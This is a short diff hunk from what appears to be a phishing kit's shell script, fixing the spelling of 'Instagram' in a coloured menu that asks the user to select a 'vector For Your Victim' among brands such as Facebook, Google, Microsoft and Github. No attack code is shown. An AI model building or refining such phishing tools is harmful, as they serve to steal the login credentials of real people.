@@ -38,7 +38,7 @@ Author:${AUTHOR}
 \e[33;1m Sellect \e[34;1mvector \e[33;1mFor Your Victim\e[0;1m
 
 [1] Facebook         [11] Google
-[2] Inatagram        [12] Microsoft
+[2] Instagram        [12] Microsoft
 [3] Twitter          [13] Yahoo
 [4] Tiktok           [14] Yandex
 [5] Pintrest         [15] Github
